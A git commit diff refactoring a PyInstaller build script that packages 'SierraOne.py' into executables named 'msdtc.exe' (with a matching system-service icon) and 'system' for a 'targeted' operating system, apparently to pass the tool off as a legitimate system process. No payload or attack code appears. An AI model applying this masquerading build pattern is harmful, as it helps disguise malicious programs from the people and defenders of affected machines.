518273afae679758724975d52c53ee79c2d35786
Arszilla <arszilla@outlook.com>
2020-04-19 03:57:23 +0300

    Update builder

--- builder.py
+++ builder.py
@@ -1,48 +1,65 @@
-import argparse
-import os
-import platform
-import subprocess
-import sys
-import time
+from argparse import ArgumentParser
+from os import remove
 from shutil import rmtree
+from subprocess import run
+from sys import exit
+from time import sleep
 
 
 def remove_junk():
     rmtree("build")
     rmtree("__pycache__")
-    
+
+
 def builder(dist):
     if dist == "windows":
-        subprocess.run(["wine", "pyinstaller", "--onefile", "--icon=images/msdtc.ico", "-n", "msdtc.exe", "SierraOne.py"])
-        time.sleep(1)
-        os.remove("msdtc.exe.spec")
+        run(["wine",
+             "pyinstaller",
+             "--onefile",
+             "--icon=images/msdtc.ico",
+             "-n",
+             "msdtc.exe",
+             "SierraOne.py"])
+        sleep(1)
+        remove("msdtc.exe.spec")
         remove_junk()
-        #subprocess.run(["rm", "-rf", "build", "__pycache__", "msdtc.exe.spec"])
         print("\nDone. Check 'dist' for your file")
+
     elif dist == "linux":
-        subprocess.run(["pyinstaller", "--onefile", "-n", "system", "SierraOne.py"])
-        time.sleep(1)
-        os.remove("system.spec")
+        run(["pyinstaller",
+             "--onefile",
+             "-n",
+             "system",
+             "SierraOne.py"])
+        sleep(1)
+        remove("system.spec")
         remove_junk()
-        #subprocess.run(["rm", "-rf", "build", "__pycache__", "system.spec"])
         print("\nDone. Check 'dist' for your file")
+
     else:
         print("Unsupported operating system")
-        
-    sys.exit(0)
-        
-def main():    
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-o", "--os", metavar="", required=True, type=str, help="Targeted operating system (Windows, Linux)")
+
+    exit(0)
+
+
+def main():
+    parser = ArgumentParser()
+    parser.add_argument("-o",
+                        "--os",
+                        metavar="",
+                        required=True,
+                        type=str,
+                        help="Targeted operating system (Windows, Linux)")
 
     try:
         args = parser.parse_args()
 
     except:
         print("Missing arguments")
-        sys.exit(0)
+        exit(0)
 
     builder(args.os.lower())
+
 
 if __name__ == "__main__":
     main()
